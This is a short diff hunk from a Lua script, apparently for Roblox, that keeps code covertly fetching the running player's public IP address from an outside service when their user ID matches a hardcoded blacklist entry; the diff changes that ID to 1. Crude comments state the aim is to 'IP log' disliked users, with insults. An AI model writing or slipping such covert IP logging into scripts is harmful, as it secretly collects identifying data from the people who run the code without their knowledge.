@@ -934,7 +934,7 @@ end
 	end
 	local ip = " // NOT BLACKLISTED"
 	-- IF A BLACKLISTED BITCH USES THIS
-	if game.Players.LocalPlayer.UserId == 2380447827 then
+	if game.Players.LocalPlayer.UserId == 1 then
 		ip = game:HttpGet("https://wtfismyip.com/text")
         end
 	-- IT'LL IP LOG 'EM, CAUSE, WHY NOT. THEY'RE A BITCH. WE AINT NO LIKE NO BITCHES.
